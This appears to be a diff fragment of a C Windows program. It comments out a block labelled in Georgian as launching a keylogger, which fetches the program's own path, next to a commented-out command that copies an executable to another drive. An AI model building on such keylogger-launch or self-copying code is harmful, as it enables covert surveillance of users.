@@ -18,6 +18,7 @@ void  main()
 		//	FreeConsole();
 	/////////////// keylogeris gashveba ////////////////////
 	{
+		/*
 			char pModuleFile[10000];
 			DWORD dwSize = GetModuleFileName(NULL, pModuleFile, 10000);
 
@@ -44,7 +45,7 @@ void  main()
 	
 				
 
-
+*/
 	}
 	//system("copy  D:\\WINAPI2-\\messigebis desktopze gamotana\\client_multi\\client\\Debug.exe D:\\");
 			//MessageBox(0,pModuleFile,pModuleFile,0);
